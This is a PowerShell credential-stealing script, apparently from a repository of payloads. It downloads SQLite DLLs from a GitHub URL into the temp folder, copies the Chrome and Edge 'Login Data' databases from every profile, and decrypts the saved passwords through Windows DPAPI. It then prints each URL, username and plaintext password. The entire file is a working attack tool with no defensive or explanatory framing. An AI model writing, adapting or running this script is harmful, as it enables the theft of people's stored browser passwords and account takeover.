# Define browser login database paths
$ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath -ErrorAction Stop
Add-Type -AssemblyName System.Security

Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
using System.Text;

public class CryptoHelper {
    public static byte[] Decrypt(byte[] encryptedData) {
        try {
            return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
        }
        catch (Exception ex) {
            return Encoding.UTF8.GetBytes("[Unable to decrypt]");
        }
    }
}
"@ -Language CSharp -ReferencedAssemblies "System.Security"

# Function to extract login data from all profiles
function Extract-Passwords {
    param (
        [string]$BrowserPath,
        [string]$BrowserName
    )

    # Check if the browser data exists
    if (-not (Test-Path $BrowserPath)) {
        Write-Output "$BrowserName not found."
        return
    }

    # Get all profiles (including "Default" and custom profiles)
    $Profiles = Get-ChildItem -Path $BrowserPath -Directory | Where-Object { $_.Name -match "Default|Profile \d+" }

    foreach ($Profile in $Profiles) {
        $LoginDB = "$($Profile.FullName)\Login Data"
        $TempDB = "$env:TEMP\$BrowserName-$($Profile.Name)-LoginData.db"

        if (Test-Path $LoginDB) {
            Copy-Item -Path $LoginDB -Destination $TempDB -Force

            # SQLite Connection String
            $ConnectionString = "Data Source=$TempDB;Version=3;"
            $Query = "SELECT origin_url, username_value, password_value FROM logins"

            # Open SQLite connection
            $SQLiteConnection = New-Object System.Data.SQLite.SQLiteConnection($ConnectionString)
            $SQLiteConnection.Open()
            $SQLiteCommand = $SQLiteConnection.CreateCommand()
            $SQLiteCommand.CommandText = $Query

            $SQLiteReader = $SQLiteCommand.ExecuteReader()

            while ($SQLiteReader.Read()) {
                $url = $SQLiteReader["origin_url"]
                $username = $SQLiteReader["username_value"]
                $encryptedPassword = $SQLiteReader["password_value"]

                # Decrypt password
                try {
                    if ($encryptedPassword -is [byte[]]) {
                        $decryptedPassword = [CryptoHelper]::Decrypt($encryptedPassword)
                        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
                    } else {
                        $decryptedPassword = "[Invalid password format]"
                    }
                }
                catch {
                    Write-Error "Error decrypting passwords from ${username}: $_"
                    $decryptedPassword = "[Unable to decrypt]"
                }

                Write-Output "[$BrowserName - $($Profile.Name)]"
                Write-Output "URL: $url"
                Write-Output "Username: $username"
                Write-Output "Password: $decryptedPassword"
                Write-Output "--------------------------------"
            }

            $SQLiteReader.Close()
            $SQLiteConnection.Close()
        }
    }
}


Extract-Passwords -BrowserPath $ChromePath -BrowserName "Chrome"
Extract-Passwords -BrowserPath $EdgePath -BrowserName "Edge"
